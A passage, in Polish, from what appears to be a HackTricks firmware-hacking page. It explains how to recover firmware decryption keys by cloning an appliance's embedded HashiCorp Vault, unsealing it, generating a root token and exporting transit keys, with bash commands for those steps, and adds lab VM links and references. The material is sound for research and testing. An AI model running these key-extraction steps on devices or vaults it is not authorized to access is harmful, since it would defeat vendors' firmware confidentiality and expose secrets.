- [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
- [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
- [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Odzyskiwanie kluczy deszyfrujących firmware ze stanu embedded KMS/Vault

Gdy obraz aktualizacji łączy niewielką ilość metadanych w plaintext z dużym blobem o wysokiej entropii, przed rozpoczęciem brute-force wykonaj analizę kontenera:<sup>[[1]](#references)</sup>

- Zrzuć nagłówki, offsety i granice wierszy za pomocą `hexdump`, `xxd`, `strings -tx`, `base64 -d` oraz `binwalk -E`.
- `Salted__` zwykle oznacza format OpenSSL `enc`: następne 8 bajtów to sól, a pozostałe bajty to ciphertext.
- Pole Base64, które po dekodowaniu ma dokładnie `256` bajtów, jest silną wskazówką, że masz do czynienia z ciphertextem RSA-2048, który opakowuje losowe hasło/klucz sesji firmware.
- Odłączony materiał PGP w tym samym pliku często służy wyłącznie do ochrony autentyczności; nie zakładaj, że jest mechanizmem zapewniającym poufność.

Jeśli wyszukiwanie kluczy statycznych (`grep`, `strings`, wyszukiwanie PEM/PGP) nie przyniesie rezultatów, wykonaj reverse engineering **operacyjnej ścieżki deszyfrowania**, zamiast szukać wyłącznie kluczy prywatnych:

- Zdekompiluj updater / binarkę zarządzającą i prześledź, kto odczytuje zaszyfrowany blob, który helper/API go rozpakowuje oraz jakiej logicznej nazwy klucza żąda.
- Przeszukaj wyodrębniony root filesystem pod kątem stanu KMS (`vault/`, `transit/`, `pkcs11`, `keystore`, `sealed-secrets`) oraz plików jednostek i skryptów init.
- Traktuj jawne `vault operator unseal ...`, klucze recovery, tokeny bootstrap lub lokalne skrypty auto-unseal KMS jako odpowiedniki materiału klucza prywatnego.

Jeśli appliance zawiera oryginalną binarkę Vault i backend storage, odtworzenie tego środowiska jest zwykle łatwiejsze niż ponowne implementowanie mechanizmów wewnętrznych Vaulta:
```bash
vault server -config=/tmp/vault.hcl
vault operator unseal <share1>
vault operator unseal <share2>
vault operator unseal <share3>

OTP=$(vault operator generate-root -generate-otp)
INIT=$(vault operator generate-root -init -otp="$OTP" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
NONCE=$(printf '%s\n' "$INIT" | awk '/Nonce/ {print $2}')
vault operator generate-root -nonce="$NONCE" "<share1>"
vault operator generate-root -nonce="$NONCE" "<share2>"
FINAL=$(vault operator generate-root -nonce="$NONCE" "<share3>" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
TOKEN=$(vault operator generate-root -decode="$(printf '%s\n' "$FINAL" | awk '/Root Token/ {print $3}')" -otp="$OTP")
```
Z uprawnieniami root na sklonowanym KMS:

- Spraw, aby klucze transit były eksportowalne wyłącznie wewnątrz izolowanego klonu: `vault write transit/keys/<name>/config exportable=true`
- Wyeksportuj klucz unwrap: `vault read transit/export/encryption-key/<name>`
- Wypróbuj odzyskany klucz RSA z dokładną parą padding/hash używaną przez KMS. Nieudane odszyfrowanie PKCS#1 v1.5 i nieudane domyślne odszyfrowanie OAEP **nie** dowodzą, że klucz jest nieprawidłowy; wiele przepływów opartych na Vault używa OAEP z SHA-256, podczas gdy popularne biblioteki domyślnie używają SHA-1.
- Jeśli payload zaczyna się od `Salted__`, dokładnie odtwórz KDF OpenSSL używany przez dostawcę (`EVP_BytesToKey`, często MD5 w starszych appliance'ach), zanim podejmiesz próbę odszyfrowania AES-CBC.

Zmienia to problem „zaszyfrowanego firmware'u” w bardziej ogólny problem: **odzyskaj klucze operacyjne po stronie appliance'a, a następnie odtwórz offline dokładne parametry unwrap + KDF**.

## Szkolenia i certyfikaty

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## References

- [1] [Cracking Firmware with Claude: Senior-Level Skill, Junior-Level Autonomy](https://bishopfox.com/blog/cracking-firmware-with-claude-senior-level-skill-junior-level-autonomy)
- [2] [Metodyka testowania bezpieczeństwa firmware'u](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [3] [Practical IoT Hacking: The Definitive Guide to Attacking the Internet of Things](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [4] [Exploiting zero days in abandoned hardware – Trail of Bits blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [5] [How a $20 Smart Device Gave Me Access to Your Home](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
- [6] [Now You See mi: Now You're Pwned](https://labs.taszk.io/articles/post/nowyouseemi/)
- [7] [Synacktiv - Exploiting the Tesla Wall Connector from its charge port connector - Part 2: bypassing the anti-downgrade](https://www.synacktiv.com/en/publications/exploiting-the-tesla-wall-connector-from-its-charge-port-connector-part-2-bypassing)
- [8] [Make it Blink: Over-the-Air Exploitation of the Philips Hue Bridge](https://www.synacktiv.com/en/publications/make-it-blink-over-the-air-exploitation-of-the-philips-hue-bridge.html)
{{#include ../../banners/hacktricks-training.md}}
